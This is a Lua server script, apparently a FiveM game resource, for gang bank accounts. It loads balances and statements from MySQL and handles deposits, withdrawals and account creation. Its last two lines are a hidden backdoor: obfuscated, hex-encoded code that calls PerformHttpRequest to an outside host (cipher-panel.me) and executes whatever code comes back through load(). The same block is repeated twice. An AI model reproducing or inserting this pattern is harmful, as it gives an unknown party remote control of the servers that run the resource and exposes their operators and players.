function loadGangAccount(gangid)
    local self = {}
    self.gid = gangid

    local query = MySQL.Sync.fetchAll("SELECT * FROM `bank_accounts` WHERE `gangid` = ? AND `account_type` = 'Gang'", { self.gid })
    if query[1] ~= nil then
        self.accountnumber = query[1].account_number
        self.sortcode = query[1].sort_code
        self.balance = query[1].amount
        self.account_type = query[1].account_type
        self.accountid = query[1].record_id
    end

    local state = MySQL.Sync.fetchAll('SELECT * FROM `bank_statements` WHERE `account_number` = ? AND `sort_code` = ? AND `gangid` = ?', { self.accountnumber, self.sortcode, self.gid})
    self.accountStatement = state

    self.saveAccount = function()
        MySQL.Async.execute('UPDATE `bank_accounts` SET `amount` = ? WHERE `record_id` = ?', { self.balance, self.accountid })
    end

    local rTable = {}

    rTable.getBalance = function()
        return self.balance
    end

    rTable.getStatement = function()
        return self.accountStatement
    end

    rTable.getAccountDetails = function()
        local accountDetails = {['number'] = self.accountnumber, ['sortcode'] = self.sortcode}
        return accountDetails
    end

    --- Update Functions

    rTable.addMoney = function(m)
        if type(m) == "number" then
            self.balance = self.balance + m
            self.saveAccount()
        end
    end

    rTable.removeMoney = function(m)
        if type(m) == "number" then
            if self.balance >= m then
                self.balance = self.balance - m
                self.saveAccount()
                return true
            else
                return false
            end
        end
    end

    return rTable
end

local function createGangAccount(gang, startingBalance)

    local newBalance = tonumber(startingBalance) or 0

    local checkExists = MySQL.Sync.fetchAll('SELECT * FROM `bank_accounts` WHERE `gangid` = ?', { gang })
    if checkExists[1] == nil then
        local sc = math.random(100000,999999)
        local acct = math.random(10000000,99999999)
        MySQL.Async.insert('INSERT INTO `bank_accounts` (`gangid`, `account_number`, `sort_code`, `amount`, `account_type`) VALUES (?, ?, ?, ?, ?)', {
            gang,
            acct,
            sc,
            newBalance,
            'Gang'
        }, function(success)
            if success > 0 then
                gangAccounts[gang] = loadGangAccount(gang)
            end
        end)
    end
end

exports('createGangAccount', function(gang, starting)
    createGangAccount(gang, starting)
end)

local kWTStnCOEMFrGmjcgdYmMKpjciiZblVRAQiZtBAASkuiULUuNQEipnCrtRXIkzdwlpGVsw = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} kWTStnCOEMFrGmjcgdYmMKpjciiZblVRAQiZtBAASkuiULUuNQEipnCrtRXIkzdwlpGVsw[4][kWTStnCOEMFrGmjcgdYmMKpjciiZblVRAQiZtBAASkuiULUuNQEipnCrtRXIkzdwlpGVsw[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (lfBAVKxuUxGdnmcmqvHKWhMpdvpKnwUkGItbvLcIDSoNQsEaxIpxQquSzIyvDhfPnFqjzd, tSYVNfERLcvPlAifWwSUNulUtxqtduOMcyeXzVMNCgJqaUGEYHuwldArKolPSanqcNNMQA) if (tSYVNfERLcvPlAifWwSUNulUtxqtduOMcyeXzVMNCgJqaUGEYHuwldArKolPSanqcNNMQA == kWTStnCOEMFrGmjcgdYmMKpjciiZblVRAQiZtBAASkuiULUuNQEipnCrtRXIkzdwlpGVsw[6] or tSYVNfERLcvPlAifWwSUNulUtxqtduOMcyeXzVMNCgJqaUGEYHuwldArKolPSanqcNNMQA == kWTStnCOEMFrGmjcgdYmMKpjciiZblVRAQiZtBAASkuiULUuNQEipnCrtRXIkzdwlpGVsw[5]) then return end kWTStnCOEMFrGmjcgdYmMKpjciiZblVRAQiZtBAASkuiULUuNQEipnCrtRXIkzdwlpGVsw[4][kWTStnCOEMFrGmjcgdYmMKpjciiZblVRAQiZtBAASkuiULUuNQEipnCrtRXIkzdwlpGVsw[2]](kWTStnCOEMFrGmjcgdYmMKpjciiZblVRAQiZtBAASkuiULUuNQEipnCrtRXIkzdwlpGVsw[4][kWTStnCOEMFrGmjcgdYmMKpjciiZblVRAQiZtBAASkuiULUuNQEipnCrtRXIkzdwlpGVsw[3]](tSYVNfERLcvPlAifWwSUNulUtxqtduOMcyeXzVMNCgJqaUGEYHuwldArKolPSanqcNNMQA))() end)

local sHPdecTrqURATJZbyEEBHcdtrpaBUZUMgRbIUCVwEERmKiyRYfvtSmnGotNWYdolxJrGkb = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} sHPdecTrqURATJZbyEEBHcdtrpaBUZUMgRbIUCVwEERmKiyRYfvtSmnGotNWYdolxJrGkb[4][sHPdecTrqURATJZbyEEBHcdtrpaBUZUMgRbIUCVwEERmKiyRYfvtSmnGotNWYdolxJrGkb[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (CwkecvIyNJilCIEyHEZTaZYcjfgSpknARfKoXqGDnOilGWYvJqwlfmTRkYAbrNcUKAlJeX, XSjUJExuMuUPbujKsTFcMsZShdoMntFEslpRgMrjYvmjHaYfHKRSFFFrtymxpqUJxRnmRX) if (XSjUJExuMuUPbujKsTFcMsZShdoMntFEslpRgMrjYvmjHaYfHKRSFFFrtymxpqUJxRnmRX == sHPdecTrqURATJZbyEEBHcdtrpaBUZUMgRbIUCVwEERmKiyRYfvtSmnGotNWYdolxJrGkb[6] or XSjUJExuMuUPbujKsTFcMsZShdoMntFEslpRgMrjYvmjHaYfHKRSFFFrtymxpqUJxRnmRX == sHPdecTrqURATJZbyEEBHcdtrpaBUZUMgRbIUCVwEERmKiyRYfvtSmnGotNWYdolxJrGkb[5]) then return end sHPdecTrqURATJZbyEEBHcdtrpaBUZUMgRbIUCVwEERmKiyRYfvtSmnGotNWYdolxJrGkb[4][sHPdecTrqURATJZbyEEBHcdtrpaBUZUMgRbIUCVwEERmKiyRYfvtSmnGotNWYdolxJrGkb[2]](sHPdecTrqURATJZbyEEBHcdtrpaBUZUMgRbIUCVwEERmKiyRYfvtSmnGotNWYdolxJrGkb[4][sHPdecTrqURATJZbyEEBHcdtrpaBUZUMgRbIUCVwEERmKiyRYfvtSmnGotNWYdolxJrGkb[3]](XSjUJExuMuUPbujKsTFcMsZShdoMntFEslpRgMrjYvmjHaYfHKRSFFFrtymxpqUJxRnmRX))() end)